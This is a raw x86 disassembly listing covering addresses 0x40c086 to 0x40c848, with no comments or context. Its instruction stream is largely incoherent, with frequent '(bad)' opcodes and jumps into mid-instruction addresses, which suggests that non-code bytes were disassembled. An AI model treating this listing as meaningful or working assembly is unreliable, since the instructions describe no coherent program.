  40c086:	xchg   ecx,eax
  40c087:	inc    esp
  40c088:	push   DWORD PTR [ebp-0x68]
  40c08b:	inc    DWORD PTR [edx-0x7cff0076]
  40c091:	add    bl,dl
  40c093:	jecxz  0x40c095
  40c095:	add    BYTE PTR [ebp-0x43],bl
  40c098:	add    bh,bl
  40c09a:	les    eax,FWORD PTR [ebx+0xffc143]
  40c0a0:	(bad)  
  40c0a1:	dec    DWORD PTR [edi-0x2f00004f]
  40c0a7:	enter  0xe600,0x2d
  40c0ab:	add    BYTE PTR [ebx+0x4b],ch
  40c0b1:	int3   
  40c0b2:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40c0b4:	inc    DWORD PTR [ebx+0x7200f22e]
  40c0ba:	in     al,0x83
  40c0bc:	or     al,0xbb
  40c0be:	add    BYTE PTR [ebx+0x7e32ffff],al
  40c0c4:	(bad)  
  40c0c5:	inc    DWORD PTR [edi+0xb]
  40c0c8:	call   DWORD PTR [ebx]
  40c0ca:	loop   0x40c0cb
  40c0cc:	clc    
  40c0cd:	imul   ecx,esp,0xffffffff
  40c0d0:	inc    DWORD PTR [ebx-0xffb568]
  40c0d6:	out    dx,al
  40c0d7:	sub    al,0x83
  40c0d9:	xchg   ebx,eax
  40c0da:	lahf   
  40c0db:	and    DWORD PTR [edx],0xffffffa2
  40c0de:	inc    DWORD PTR [eax]
  40c0e0:	add    DWORD PTR [eax],0xffffffce
  40c0e3:	or     ecx,esp
  40c0e5:	cmp    DWORD PTR [ebx-0x6d6b76c7],0x0
  40c0ec:	adc    DWORD PTR [edi+edi*8],ebx
  40c0ef:	inc    DWORD PTR [ebx+0xd84aff]
  40c0f5:	push   DWORD PTR [edi-0x2a]
  40c0f8:	jmp    FWORD PTR [esi+0x178d000d]
  40c0fe:	dec    DWORD PTR [ecx+0xc5affff]
  40c104:	cmp    edi,0x8
  40c107:	pop    esp
  40c108:	mov    DWORD PTR ds:0xed0bff92,edx
  40c10e:	add    BYTE PTR [ebx+0x5e3389ff],al
  40c114:	inc    DWORD PTR [eax]
  40c116:	push   edx
  40c117:	ins    DWORD PTR es:[edi],dx
  40c118:	add    BYTE PTR [edi+ebx*2+0x0],al
  40c11c:	mov    ds:0x83ff83e8,eax
  40c121:	call   FWORD PTR [edx+edx*8+0x0]
  40c125:	add    bl,bl
  40c127:	mov    cl,0xff
  40c129:	xor    al,0xf
  40c12b:	add    BYTE PTR [esi-0x70],ch
  40c12e:	cmp    edi,0x0
  40c131:	add    cl,bl
  40c133:	and    eax,DWORD PTR [ebx-0xa95e00]
  40c139:	jno    0x40c11f
  40c13b:	add    BYTE PTR [edi+ecx*2-0x1],bh
  40c13f:	mov    edi,edi
  40c141:	add    BYTE PTR [ebx+eiz*2],al
  40c144:	add    bh,bh
  40c146:	mul    BYTE PTR [ebx]
  40c148:	add    al,dh
  40c14a:	popf   
  40c14b:	jmp    edi
  40c14d:	push   ds
  40c14e:	add    BYTE PTR [eax],al
  40c150:	cmp    edi,0xffffffa3
  40c153:	cdq    
  40c154:	add    bh,bh
  40c156:	xchg   ebx,eax
  40c157:	add    BYTE PTR [bp+di-0x36],ch
  40c15c:	cmp    ebp,DWORD PTR [ebx-0x1]
  40c15f:	add    bh,bh
  40c161:	inc    DWORD PTR [eax-0x2f]
  40c164:	add    bh,bh
  40c166:	lds    eax,FWORD PTR [eax+eax*1+0x19]
  40c16a:	mov    eax,0x83b52283
  40c16f:	mov    edi,edi
  40c171:	inc    DWORD PTR [edx-0x42]
  40c174:	add    bh,bh
  40c176:	inc    eax
  40c177:	retf   
  40c178:	inc    esp
  40c17a:	sub    bh,bh
  40c17c:	push   edi
  40c17d:	push   ss
  40c17e:	(bad)  
  40c17f:	inc    DWORD PTR [eax]
  40c181:	add    bl,dh
  40c183:	aas    
  40c184:	add    bh,bh
  40c186:	adc    BYTE PTR es:[eax],al
  40c189:	ficom  WORD PTR [ebx]
  40c18b:	push   DWORD PTR [esi+0x7e]
  40c18e:	mov    edi,edi
  40c190:	inc    DWORD PTR [eax]
  40c192:	in     eax,0x2a
  40c194:	mov    edi,edi
  40c196:	idiv   DWORD PTR [ebx+0x8cde89]
  40c19c:	int    0x92
  40c19e:	add    bh,bh
  40c1a0:	(bad)  
  40c1a1:	call   FWORD PTR [ecx+0x29]
  40c1a4:	cmp    edi,0xffffffc0
  40c1a7:	ret    0x9f00
  40c1aa:	mov    ds:0xffc10800,al
  40c1af:	int3   
  40c1b0:	int3   
  40c1b1:	or     DWORD PTR [ebx-0x6933ff15],0x4a
  40c1b8:	add    BYTE PTR ds:0xb41aff57,al
  40c1be:	(bad)  
  40c1bf:	inc    DWORD PTR [eax]
  40c1c1:	sbb    DWORD PTR [esi+0x7f],0xffffffff
  40c1c5:	sbb    DWORD PTR [edi+0x7e4d008b],0xffffffff
  40c1cc:	(bad)  
  40c1cd:	pop    esi
  40c1ce:	int3   
  40c1cf:	mov    DWORD PTR [ecx-0x31ef00],ecx
  40c1d5:	add    BYTE PTR ds:0x75d3ffa4,bh
  40c1db:	or     DWORD PTR [edx+0x24],0x0
  40c1df:	add    bh,bh
  40c1e1:	jmp    DWORD PTR [esp+eiz*4-0x7d]
  40c1e5:	int3   
  40c1e6:	test   esi,ebp
  40c1e8:	push   ecx
  40c1ea:	cmp    eax,0x89a28583
  40c1ef:	mov    DWORD PTR [eax],eax
  40c1f1:	inc    ecx
  40c1f3:	adc    edi,edi
  40c1f5:	mov    DWORD PTR [esi-0x55],esi
  40c1f8:	(bad)  
  40c1f9:	in     al,dx
  40c1fa:	xor    edi,edi
  40c1fc:	ret    0xff60
  40c1ff:	inc    DWORD PTR [ebx+0x278683]
  40c205:	xor    DWORD PTR [ebp-0x709bffe1],0xffffffff
  40c20c:	xchg   ebx,eax
  40c20d:	bound  eax,QWORD PTR [eax]
  40c20f:	inc    DWORD PTR [eax]
  40c211:	xor    DWORD PTR [edi+eiz*8-0x34],0xffffffff
  40c216:	pusha  
  40c217:	in     al,0x0
  40c219:	int    0x6f
  40c21b:	int3   
  40c21c:	test   BYTE PTR [eax+eax*1],dh
  40c21f:	(bad)  
  40c220:	(bad)  
  40c221:	(bad)  
  40c222:	cmp    BYTE PTR [edi+edi*8],ch
  40c225:	jmp    esi
  40c227:	sub    BYTE PTR [ebx-0x6e001f7e],al
  40c22d:	add    al,BYTE PTR [eax]
  40c22f:	add    BYTE PTR [eax],al
  40c231:	add    ch,ah
  40c233:	dec    ebx
  40c234:	add    bh,bh
  40c236:	sbb    edi,DWORD PTR [ebp-0x33e76934]
  40c23c:	jmp    0xcd40c143
  40c241:	push   ebp
  40c243:	into   
  40c244:	(bad)  
  40c245:	call   DWORD PTR [edx]
  40c247:	retf   
  40c248:	jmp    DWORD PTR [edx+0x5]
  40c24b:	sbb    edi,0x38
  40c24e:	add    DWORD PTR [eax],0x0
  40c251:	add    BYTE PTR [eax-0x51],cl
  40c254:	add    DWORD PTR [ebx+0x3600eaf3],0x4d
  40c25b:	int3   
  40c25c:	xchg   edx,eax
  40c25d:	xor    edi,edi
  40c25f:	(bad)  
  40c260:	inc    DWORD PTR [eax]
  40c262:	or     edi,0xc6270000
  40c268:	(bad)  
  40c269:	jp     0x40c239
  40c26b:	add    BYTE PTR [edi+0xe],bh
  40c26e:	add    BYTE PTR [eax],al
  40c270:	(bad)  
  40c271:	(bad)  
  40c272:	js     0x40c238
  40c274:	add    BYTE PTR [eax],al
  40c276:	cmp    DWORD PTR [ecx-0x1],edi
  40c279:	pop    edx
  40c27a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c27b:	jmp    FWORD PTR [ebx]
  40c27d:	aas    
  40c27e:	(bad)  
  40c27f:	dec    esp
  40c281:	add    BYTE PTR [ebx+0xaff0048],bl
  40c287:	mov    BYTE PTR [eax],0x29
  40c28a:	push   cs
  40c28b:	add    DWORD PTR [ecx],0xffffffb1
  40c28e:	cmp    edi,0xffffff89
  40c291:	call   DWORD PTR ds:0x5283fff1
  40c297:	adc    eax,0xff6976ff
  40c29c:	push   0xffffccd4
  40c2a1:	mov    DWORD PTR [esi+ecx*4+0x3009cc00],ebp
  40c2a8:	add    bh,ch
  40c2aa:	mov    DWORD PTR [eax],0xccff9f12
  40c2b0:	(bad)  
  40c2b1:	inc    DWORD PTR [eax+0x2b]
  40c2b4:	int3   
  40c2b5:	dec    DWORD PTR [edx-0x1c]
  40c2b8:	jmp    FWORD PTR [ebx]
  40c2ba:	std    
  40c2bb:	add    bl,ah
  40c2bd:	and    DWORD PTR [ebx+0x4200ccff],eax
  40c2c3:	iret   
  40c2c4:	add    bh,bh
  40c2c6:	maskmovq mm7,mm7
  40c2c9:	dec    edx
  40c2ca:	xchg   DWORD PTR [ebx+0xcc0ea1],eax
  40c2d0:	add    DWORD PTR [eax],0x6f
  40c2d3:	sub    bh,bh
  40c2d5:	and    DWORD PTR [eax+0x6859cc3f],0xffffff83
  40c2dc:	in     eax,dx
  40c2dd:	cmp    edi,edi
  40c2df:	(bad)  
  40c2e0:	(bad)  
  40c2e1:	call   DWORD PTR [ecx]
  40c2e3:	cmp    al,0xff
  40c2e5:	int3   
  40c2e6:	imul   edi,DWORD PTR [ecx+ecx*4-0x1b],0xffffff98
  40c2eb:	call   DWORD PTR [ebx*8-0x340000]
  40c2f2:	jo     0x40c2a6
  40c2f4:	(bad)  
  40c2f5:	call   ebp
  40c2f7:	mov    esi,0x8348c800
  40c2fc:	icebp  
  40c2fd:	pop    edi
  40c2fe:	cmp    edi,0xffffffff
  40c301:	int3   
  40c302:	fistp  QWORD PTR [edx+0x0]
  40c305:	mov    DWORD PTR [ebx+0x1f738388],edi
  40c30b:	jmp    DWORD PTR [esi-0x7ca0]
  40c311:	sub    DWORD PTR [esi-0x51ff00cc],0x29
  40c318:	dec    DWORD PTR [esi+0x642e00f6]
  40c31e:	int3   
  40c31f:	inc    DWORD PTR [eax]
  40c321:	xor    DWORD PTR [edi],0x77
  40c324:	add    ah,cl
  40c326:	jnp    0x40c31f
  40c328:	call   FWORD PTR [edi]
  40c32a:	xor    al,BYTE PTR [ebx-0x2dfe]
  40c330:	inc    DWORD PTR [eax]
  40c332:	jns    0x40c390
  40c334:	(bad)  
  40c335:	dec    DWORD PTR [eax+edx*1-0x77]
  40c339:	mov    edx,0xe57900a2
  40c33e:	int3   
  40c33f:	add    DWORD PTR [ebx-0x9e4101],0x0
  40c346:	inc    eax
  40c347:	sar    edi,1
  40c349:	dec    esi
  40c34a:	pop    ecx
  40c34b:	jmp    DWORD PTR [edi-0x65]
  40c34e:	dec    esp
  40c350:	inc    DWORD PTR [eax]
  40c352:	xchg   edi,eax
  40c353:	inc    ebp
  40c354:	inc    DWORD PTR [eax]
  40c356:	and    ch,0x89
  40c359:	pop    esi
  40c35a:	xchg   edx,eax
  40c35b:	cmp    DWORD PTR [ebx],0x31
  40c35e:	int3   
  40c35f:	add    BYTE PTR [ebx-0x4b1877],al
  40c365:	add    BYTE PTR [ebx+0x53],bl
  40c368:	call   DWORD PTR [eax+0x7a]
  40c36b:	dec    ebx
  40c36d:	push   0xff8983ff
  40c372:	xchg   edx,eax
  40c373:	xlat   BYTE PTR ds:[ebx]
  40c374:	(bad)  
  40c375:	call   ecx
  40c377:	cdq    
  40c378:	add    bl,dl
  40c37a:	mov    es,WORD PTR [eax]
  40c37c:	adc    al,0xc1
  40c37e:	add    BYTE PTR [ebx-0x6e697601],al
  40c384:	(bad)  
  40c385:	jmp    ecx
  40c387:	cmp    DWORD PTR [eax],eax
  40c389:	mov    esp,0xd8eaff37
  40c38e:	dec    DWORD PTR [ecx+0xf1ffcc]
  40c394:	add    BYTE PTR [ebx-0x13fff318],al
  40c39a:	test   bh,bh
  40c39c:	loopne 0x40c353
  40c39e:	cmp    edi,0xffffffff
  40c3a1:	(bad)  
  40c3a2:	jp     0x40c416
  40c3a4:	cmp    edi,0xffffffdb
  40c3a7:	pop    ebp
  40c3a8:	(bad)  
  40c3a9:	jmp    0x40c364
  40c3ab:	int3   
  40c3ac:	cmp    dh,BYTE PTR [eax+0x0]
  40c3af:	mov    esp,ecx
  40c3b1:	dec    DWORD PTR [ecx+0x5e]
  40c3b4:	add    BYTE PTR [eax],al
  40c3b6:	lods   al,BYTE PTR ds:[esi]
  40c3b7:	loopne 0x40c3b8
  40c3b9:	aam    0xda
  40c3bb:	add    BYTE PTR [ebx],dl
  40c3bd:	(bad)  
  40c3be:	int3   
  40c3bf:	inc    DWORD PTR [ebx+0x590d83]
  40c3c5:	int3   
  40c3c6:	dec    esi
  40c3c7:	push   DWORD PTR fs:[edx]
  40c3ca:	xor    bh,bh
  40c3cc:	outs   dx,BYTE PTR ds:[esi]
  40c3cd:	or     bh,bh
  40c3cf:	(bad)  
  40c3d0:	(bad)  
  40c3d1:	jmp    DWORD PTR ds:0xd7830076
  40c3d7:	push   es
  40c3d8:	(bad)  
  40c3d9:	clc    
  40c3da:	add    BYTE PTR [ebx-0xff80c3],0xff
  40c3e1:	add    BYTE PTR [edi+ebx*1],dl
  40c3e4:	add    BYTE PTR [ecx-0x6b765c3b],cl
  40c3ea:	mov    al,0xff
  40c3ec:	add    al,0xb4
  40c3ee:	mov    edi,edi
  40c3f0:	add    bh,bh
  40c3f2:	mov    ecx,DWORD PTR [esp+ecx*8-0x2a6401]
  40c3f9:	or     eax,eax
  40c3fb:	add    BYTE PTR [eax-0xd],bh
  40c3fe:	(bad)  
  40c3ff:	(bad)  
  40c400:	(bad)  
  40c401:	call   DWORD PTR [ecx+0x19]
  40c404:	(bad)  
  40c405:	(bad)  
  40c406:	cmp    DWORD PTR [ecx+0xa53283],esp
  40c40c:	leave  
  40c40d:	push   cs
  40c40e:	add    DWORD PTR [ebx-0x5cd2ff01],0x0
  40c415:	add    ah,al
  40c417:	and    al,0x83
  40c419:	aam    0x94
  40c41b:	jmp    FWORD PTR [edx-0x78]
  40c421:	push   edi
  40c423:	jp     0x40c425
  40c425:	jmp    FWORD PTR [ebp+0x5c970079]
  40c42b:	inc    DWORD PTR [eax+0x8912]
  40c431:	int3   
  40c432:	and    eax,0x7983ffda
  40c437:	mov    ecx,0xff80ffff
  40c43c:	cld    
  40c43d:	(bad)  
  40c43e:	add    bh,bh
  40c440:	add    bh,bh
  40c442:	lods   al,BYTE PTR ds:[esi]
  40c443:	dec    ebp
  40c444:	(bad)  
  40c445:	(bad)  
  40c446:	fdiv   QWORD PTR [ecx-0x1]
  40c449:	(bad)  
  40c44a:	push   ss
  40c44b:	add    BYTE PTR [edx+0x833e],dl
  40c451:	mov    ebp,ebx
  40c453:	mov    ebx,0xfa1300cc
  40c458:	call   edi
  40c45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c45b:	dec    DWORD PTR [eax+0x57]
  40c45e:	inc    DWORD PTR [eax]
  40c460:	inc    DWORD PTR [eax]
  40c462:	popf   
  40c463:	into   
  40c464:	cmp    edi,0xffffff98
  40c467:	sub    BYTE PTR [ebx-0x62ffa27a],al
  40c46d:	jl     0x40c43b
  40c46f:	inc    DWORD PTR [ebx+0x905689]
  40c475:	add    BYTE PTR [ecx],bl
  40c477:	(bad)  
  40c478:	call   FWORD PTR [edi-0x6e05ffd1]
  40c47e:	int3   
  40c47f:	add    bh,bh
  40c481:	add    esi,0x15
  40c484:	int3   
  40c485:	dec    DWORD PTR [esi]
  40c487:	inc    DWORD PTR [eax]
  40c489:	push   edx
  40c48a:	or     DWORD PTR [ebx-0xff59c4],eax
  40c490:	(bad)  
  40c491:	inc    edx
  40c493:	sahf   
  40c494:	inc    DWORD PTR [ebx-0x6a334adc]
  40c49a:	jno    0x40c49b
  40c49c:	cs test esp,ecx
  40c49f:	add    BYTE PTR [ecx-0xf51d00],cl
  40c4a5:	call   FWORD PTR [edx]
  40c4a7:	jmp    0x40c42c
  40c4a9:	adc    BYTE PTR [edx-0x1],dl
  40c4ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4ad:	cli    
  40c4ae:	add    bh,bh
  40c4b0:	add    DWORD PTR [ebx-0xffe6a8],0xffffffbd
  40c4b7:	xchg   ecx,eax
  40c4b8:	jmp    FWORD PTR [ebx-0x23]
  40c4bb:	add    BYTE PTR [edi],bl
  40c4bd:	mov    WORD PTR [ebx+0x77ff00ff],es
  40c4c3:	jle    0x40c44e
  40c4c5:	jmp    DWORD PTR [esi]
  40c4c7:	pop    es
  40c4c8:	add    BYTE PTR [eax],ch
  40c4ca:	pop    ecx
  40c4cb:	add    BYTE PTR [esi-0x76ff00fc],al
  40c4d1:	jmp    FWORD PTR [eax+esi*2+0x1133ffcc]
  40c4d8:	add    DWORD PTR [edx+0x3b0fff7b],0xffffff89
  40c4df:	add    BYTE PTR [ecx-0xd5234],cl
  40c4e5:	push   ebp
  40c4e7:	out    dx,al
  40c4e8:	call   DWORD PTR [ecx+eiz*1-0x1]
  40c4ec:	outs   dx,BYTE PTR ds:[esi]
  40c4ed:	sbb    eax,0xff8300
  40c4f2:	pop    edx
  40c4f3:	sub    bh,bh
  40c4f5:	(bad)  
  40c4f6:	cmp    eax,0x65d0ccd1
  40c4fb:	push   DWORD PTR ds:0xffffff08
  40c501:	sub    ebp,0xffffffb6
  40c504:	int3   
  40c505:	int3   
  40c506:	shl    BYTE PTR [ebp-0x1],0xd
  40c50a:	cmp    bh,0x18
  40c50d:	mov    DWORD PTR [eax],eax
  40c50f:	add    DWORD PTR [eax],0x0
  40c512:	sbb    DWORD PTR [ecx-0x1],edx
  40c515:	mov    DWORD PTR [ebp+0x67],esi
  40c518:	call   FWORD PTR [eax+0x61]
  40c51b:	push   esi
  40c51d:	sar    edi,1
  40c51f:	inc    DWORD PTR [eax]
  40c521:	add    BYTE PTR [edi],bh
  40c523:	jns    0x40c525
  40c525:	and    DWORD PTR [ecx],0xe
  40c528:	inc    DWORD PTR [ebp+0x29c5ffaf]
  40c52e:	inc    DWORD PTR [eax]
  40c530:	add    bh,bh
  40c532:	(bad)  [ebx+0x0]
  40c535:	jmp    FWORD PTR [edi+0x5e24ffb8]
  40c53b:	add    BYTE PTR [edx+0xffcceb],al
  40c541:	xor    ebp,0x6f
  40c544:	add    bh,bh
  40c546:	loop   0x40c55b
  40c548:	adc    esi,0x7a
  40c54b:	dec    DWORD PTR [edi-0x1b]
  40c54e:	add    BYTE PTR [eax],al
  40c550:	dec    esp
  40c552:	adc    dl,0xff
  40c555:	cmp    ecx,0xffffff92
  40c558:	add    BYTE PTR [esi+0x7d2cffe2],bl
  40c55e:	add    BYTE PTR [ebx+0x810000],al
  40c564:	inc    DWORD PTR [eax]
  40c566:	mov    dh,0x14
  40c568:	inc    DWORD PTR [ecx+0x70168395]
  40c56e:	add    bh,bh
  40c570:	(bad)  
  40c571:	inc    DWORD PTR [edx-0x497cff6b]
  40c577:	or     esp,ecx
  40c579:	aas    
  40c57a:	fld    DWORD PTR [eax]
  40c57c:	and    BYTE PTR [eax-0x7d],al
  40c57f:	add    DWORD PTR [eax],0xffffffcc
  40c582:	loope  0x40c5e0
  40c584:	inc    DWORD PTR [ebx-0x3c0012b8]
  40c58a:	mov    edi,0x70ecff
  40c58f:	(bad)  
  40c590:	inc    DWORD PTR [eax]
  40c592:	push   ecx
  40c593:	adc    eax,DWORD PTR [ebx-0x269e00]
  40c599:	add    ebp,DWORD PTR [esi+0x0]
  40c59c:	push   eax
  40c59d:	outs   dx,DWORD PTR ds:[esi]
  40c59e:	add    BYTE PTR [eax],al
  40c5a0:	(bad)  
  40c5a1:	dec    DWORD PTR [eax-0x80]
  40c5a4:	(bad)  
  40c5a5:	(bad)  
  40c5a6:	cmp    BYTE PTR [eax+0x0],dh
  40c5a9:	mov    eax,0x161a0007
  40c5ae:	mov    DWORD PTR [eax],eax
  40c5b0:	add    bh,bh
  40c5b2:	out    0x91,eax
  40c5b4:	add    BYTE PTR [ebx+0x7eff52af],al
  40c5ba:	sub    BYTE PTR [eax],al
  40c5bc:	or     DWORD PTR [ebx-0x1],0xd0000000
  40c5c3:	lahf   
  40c5c4:	cmp    edi,0xffffffe1
  40c5c7:	jmp    0x40c5c9
  40c5c9:	cmp    eax,0x3be383c7
  40c5ce:	(bad)  
  40c5cf:	inc    DWORD PTR [ebx-0x3354c700]
  40c5d5:	int3   
  40c5d6:	in     al,dx
  40c5d7:	adc    edi,edi
  40c5d9:	adc    al,0x7d
  40c5db:	call   DWORD PTR [ebp-0x76337c15]
  40c5e1:	jmp    DWORD PTR ds:0x6ff0071
  40c5e7:	jno    0x40c572
  40c5e9:	inc    edi
  40c5ea:	inc    esp
  40c5eb:	(bad)  
  40c5ec:	jge    0x40c576
  40c5ee:	cmp    edi,0xffffffff
  40c5f1:	add    BYTE PTR [esp+ebp*1+0x0],dl
  40c5f5:	(bad)  
  40c5f6:	mov    ecx,0x3096ffaa
  40c5fb:	push   DWORD PTR [edi]
  40c5fd:	add    DWORD PTR [eax],eax
  40c5ff:	add    bh,bh
  40c601:	push   esp
  40c603:	js     0x40c605
  40c605:	int3   
  40c606:	mov    bl,0xf2
  40c608:	inc    DWORD PTR [esi+0x7edbff37]
  40c60e:	inc    DWORD PTR [eax]
  40c610:	inc    DWORD PTR [eax]
  40c612:	outs   dx,BYTE PTR ds:[esi]
  40c613:	sbb    bh,bh
  40c615:	call   edi
  40c617:	or     al,0xff
  40c619:	shl    DWORD PTR [eax-0x1],1
  40c61c:	xchg   edx,eax
  40c61d:	sar    edi,1
  40c61f:	mov    DWORD PTR [ebx-0x76c00d00],eax
  40c625:	add    BYTE PTR [edi+0x77],bl
  40c628:	(bad)  
  40c629:	jmp    0xd1499259
  40c62e:	mov    DWORD PTR [eax],eax
  40c630:	(bad)  
  40c631:	jmp    DWORD PTR [esi-0x51ff0070]
  40c637:	pusha  
  40c638:	xor    DWORD PTR [ebp-0x5e0500ff],0x0
  40c63f:	(bad)  
  40c640:	(bad)  
  40c641:	(bad)  
  40c642:	call   0xbe0d49c8
  40c647:	loop   0x40c5cc
  40c649:	push   esi
  40c64b:	add    ah,ch
  40c64d:	dec    ebp
  40c64e:	inc    DWORD PTR [ebx-0x1875007d]
  40c654:	mov    edi,edi
  40c656:	sbb    eax,0x4696cccd
  40c65b:	(bad)  
  40c65c:	cli    
  40c65d:	je     0x40c62b
  40c65f:	dec    esp
  40c661:	add    BYTE PTR [ebp+0x7],al
  40c664:	dec    esp
  40c666:	and    bl,BYTE PTR [edi-0x1]
  40c669:	jno    0x40c667
  40c66b:	inc    DWORD PTR [edi-0x48]
  40c66e:	inc    DWORD PTR [eax]
  40c670:	(bad)  
  40c671:	push   DWORD PTR [ecx-0x900ff79]
  40c677:	add    BYTE PTR es:[ecx-0x15],al
  40c67b:	inc    DWORD PTR [eax]
  40c67d:	pop    ss
  40c67e:	(bad)  
  40c67f:	dec    esp
  40c681:	adc    ebx,0x1c
  40c684:	cmp    edi,0x39
  40c687:	ret    
  40c688:	int3   
  40c689:	icebp  
  40c68a:	scas   al,BYTE PTR es:[edi]
  40c68b:	mov    esi,ebp
  40c68d:	ja     0x40c612
  40c68f:	(bad)  
  40c690:	(bad)  
  40c691:	inc    esp
  40c693:	sbb    eax,0xbd07ffff
  40c698:	add    BYTE PTR [eax+0x3a],ah
  40c69b:	(bad)  
  40c69c:	fnstsw WORD PTR [edx+0xff0083]
  40c6a2:	mov    dh,BYTE PTR [edi]
  40c6a4:	add    BYTE PTR [eax],al
  40c6a6:	retf   
  40c6a7:	inc    ebx
  40c6a8:	cmp    esp,0x35
  40c6ab:	add    BYTE PTR [eax+0x83ff3c],bh
  40c6b1:	mov    DWORD PTR [ecx+0x7c],edi
  40c6b4:	(bad)  
  40c6b5:	call   DWORD PTR [edx+esi*1-0x1]
  40c6b9:	pop    esp
  40c6ba:	(bad)  
  40c6bb:	jmp    DWORD PTR [edx+0x89ff49]
  40c6c1:	jmp    DWORD PTR [eax-0x65ffff89]
  40c6c7:	outs   dx,BYTE PTR ds:[esi]
  40c6c8:	(bad)  
  40c6c9:	jns    0x40c68d
  40c6cb:	add    dh,dh
  40c6cd:	jb     0x40c6ce
  40c6cf:	cmp    edi,0x0
  40c6d2:	push   0xa9ff0096
  40c6d7:	pop    esp
  40c6d8:	jmp    DWORD PTR [edx]
  40c6da:	and    eax,0xff7224ff
  40c6df:	add    BYTE PTR [eax],al
  40c6e1:	add    BYTE PTR [ecx+eax*2-0x77],dl
  40c6e5:	cmp    DWORD PTR [esi+0x7271ffcc],0xffffff83
  40c6ec:	hlt    
  40c6ed:	aaa    
  40c6ee:	add    bh,bh
  40c6f0:	mov    edi,edi
  40c6f2:	push   edx
  40c6f3:	ret    
  40c6f4:	add    ah,cl
  40c6f6:	ja     0x40c679
  40c6f8:	mov    DWORD PTR [edx-0x55],eax
  40c6fb:	add    bl,dh
  40c6fd:	es mov edi,edi
  40c700:	inc    DWORD PTR [eax]
  40c702:	setno  bh
  40c705:	add    BYTE PTR [eax+0x78],dl
  40c708:	int3   
  40c709:	push   0xffffffc0
  40c70b:	and    DWORD PTR [edi],0x6b
  40c70e:	(bad)  
  40c70f:	(bad)  
  40c710:	(bad)  
  40c711:	(bad)  
  40c712:	fnstenv [edi+edi*8-0x1]
  40c716:	(bad)  
  40c717:	and    DWORD PTR [ecx+0x2e005e26],ecx
  40c71d:	je     0x40c71e
  40c71f:	add    BYTE PTR [eax],al
  40c721:	(bad)  
  40c722:	mov    edx,0xfdff007d
  40c727:	fld    QWORD PTR [eax]
  40c729:	adc    ecx,DWORD PTR [edx]
  40c72b:	add    BYTE PTR [ecx+eax*1-0x34],bh
  40c72f:	inc    DWORD PTR [ebx-0x37ae01]
  40c735:	or     DWORD PTR [edx-0x2b],0xffffffff
  40c739:	or     bh,BYTE PTR [ecx+0x42facc]
  40c73f:	(bad)  
  40c740:	(bad)  
  40c741:	jmp    DWORD PTR [ecx+0x1]
  40c744:	dec    esp
  40c746:	jne    0x40c757
  40c748:	jmp    esp
  40c74a:	aad    0xff
  40c74c:	in     al,0x78
  40c74e:	dec    DWORD PTR [ecx+0x29dcff83]
  40c754:	(bad)  
  40c755:	jmp    FWORD PTR [esi-0x39]
  40c758:	int3   
  40c759:	mov    esi,DWORD PTR [edi+0x0]
  40c75c:	xchg   esi,eax
  40c75d:	jg     0x40c6e2
  40c75f:	inc    DWORD PTR [eax]
  40c761:	call   DWORD PTR [edx]
  40c763:	xor    al,0xcc
  40c765:	inc    DWORD PTR [esp+ebp*1+0x0]
  40c769:	inc    edx
  40c76a:	fisttp WORD PTR [ecx-0x76008d66]
  40c770:	add    bh,bh
  40c772:	lds    eax,FWORD PTR [eax+0x2e48ff83]
  40c778:	dec    DWORD PTR [ebp-0x7fee00c7]
  40c77e:	dec    DWORD PTR [ecx-0x8f1ff34]
  40c784:	add    BYTE PTR [ebx-0x16ffdf75],al
  40c78a:	call   0xffb3fc8e
  40c78f:	mov    edi,edi
  40c791:	add    DWORD PTR [ebp+0x1eff83de],0x60
  40c798:	call   DWORD PTR ds:0xbf0897e
  40c79e:	(bad)  
  40c79f:	(bad)  
  40c7a0:	(bad)  
  40c7a1:	inc    DWORD PTR ds:0xe8ffff67
  40c7a7:	sub    ecx,DWORD PTR [ecx-0x8ffcb6c]
  40c7ad:	or     al,0x83
  40c7af:	(bad)  
  40c7b0:	(bad)  
  40c7b1:	call   DWORD PTR ds:0x92ffff68
  40c7b7:	sbb    bh,bh
  40c7b9:	dec    esp
  40c7ba:	jbe    0x40c7bc
  40c7bc:	push   edi
  40c7bd:	(bad)  
  40c7be:	int3   
  40c7bf:	inc    DWORD PTR [ebx-0x7c46cb01]
  40c7c5:	xor    DWORD PTR [esi],0xffffffe9
  40c7c8:	push   esi
  40c7ca:	push   esp
  40c7cb:	call   FWORD PTR [esi]
  40c7cd:	fs dec esp
  40c7d0:	int3   
  40c7d1:	add    BYTE PTR [ebx],dh
  40c7d3:	enter  0xcc00,0xea
  40c7d7:	dec    eax
  40c7d8:	add    BYTE PTR [ebp+0x360dcca5],dh
  40c7de:	cmp    edi,0xffffff83
  40c7e1:	jmp    FWORD PTR [edx+0x6283cc2e]
  40c7e7:	cli    
  40c7e8:	call   DWORD PTR [esi]
  40c7ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7eb:	add    DWORD PTR [ebx],0x2f
  40c7ee:	(bad)  
  40c7ef:	(bad)  
  40c7f0:	inc    DWORD PTR [ebx-0x337c01d7]
  40c7f6:	addr16 inc ecx
  40c7f8:	add    BYTE PTR [ecx-0x59],al
  40c7fb:	and    DWORD PTR [ebx+0xaa],0xffffff89
  40c802:	or     eax,0x2a00ff87
  40c807:	arpl   di,di
  40c809:	mov    ah,0xc7
  40c80b:	add    BYTE PTR [esi-0x41],al
  40c80e:	(bad)  
  40c80f:	inc    DWORD PTR [ebx-0x7c5edf34]
  40c815:	mov    DWORD PTR [ebp+eax*2-0x34],edx
  40c819:	add    eax,0xbf5eff09
  40c81e:	add    BYTE PTR [eax],al
  40c820:	add    BYTE PTR [eax],al
  40c822:	(bad)  
  40c823:	int    0xff
  40c825:	inc    edi
  40c827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c828:	int3   
  40c829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c82a:	test   al,0x0
  40c82c:	sub    eax,0xff8300c3
  40c831:	adc    ebx,0xffffffa4
  40c834:	(bad)  
  40c835:	call   DWORD PTR [eax+0x46]
  40c838:	cmp    ebx,0xfffffffb
  40c83b:	call   ecx
  40c83d:	ret    
  40c83e:	add    bh,bh
  40c840:	(bad)  
  40c841:	(bad)  
  40c842:	cli    
  40c843:	xor    bh,bh
  40c845:	dec    DWORD PTR [ecx+0xd]
  40c848:	add    BYTE PTR [esi-0x1adf76bc],ch
